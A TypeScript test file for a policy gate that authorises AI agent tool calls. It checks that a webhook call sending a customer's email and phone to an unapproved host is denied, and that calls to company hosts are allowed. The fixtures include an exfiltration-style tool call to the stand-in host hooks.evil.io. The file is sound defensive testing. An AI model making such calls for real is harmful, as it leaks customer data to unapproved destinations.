import { DECISION_EFFECT, LocalGate } from '@memnox/core';
import { describe, expect, it } from 'vitest';

import { LocalGateAuthorizer } from '../src/call-authorizer';
import { readToolCall } from '../src/tool-call';

const gate = new LocalGate(
  [
    {
      name: 'customer-data-stays-approved',
      match: {
        actions: ['*'],
        dataClassifications: ['customer-record'],
        targets: ['*', '!*.ourcompany.com'],
      },
      decision: {
        effect: DECISION_EFFECT.DENY,
        reason: 'customer records leave only to destinations the team approved',
        alternative: { action: 'ticket.reply', note: 'reply inside the ticket instead' },
      },
    },
  ],
  { agentName: 'claude-code' },
);

const RECORD = { customer: { email: 'dana@gmail.com', phone: '+1 415 555 0134' } };

describe('a proxied MCP call carrying a customer record', () => {
  const authorizer = new LocalGateAuthorizer(gate, 'slack');

  it('is refused on its way to a webhook nobody approved, with the way forward', async () => {
    const verdict = await authorizer.authorize(
      readToolCall({
        name: 'post_webhook',
        arguments: { url: 'https://hooks.evil.io/x', payload: RECORD },
      }),
    );
    expect(verdict.effect).toBe(DECISION_EFFECT.DENY);
    expect(verdict.alternative?.note).toBe('reply inside the ticket instead');
  });

  it('goes to an approved host, and a call with nobody in it goes anywhere', async () => {
    const approved = await authorizer.authorize(
      readToolCall({
        name: 'post_webhook',
        arguments: { url: 'https://hooks.ourcompany.com/x', payload: RECORD },
      }),
    );
    expect(approved.effect).toBe(DECISION_EFFECT.ALLOW);
    const plain = await authorizer.authorize(
      readToolCall({
        name: 'post_webhook',
        arguments: { url: 'https://hooks.evil.io/x' },
      }),
    );
    expect(plain.effect).toBe(DECISION_EFFECT.ALLOW);
  });
});
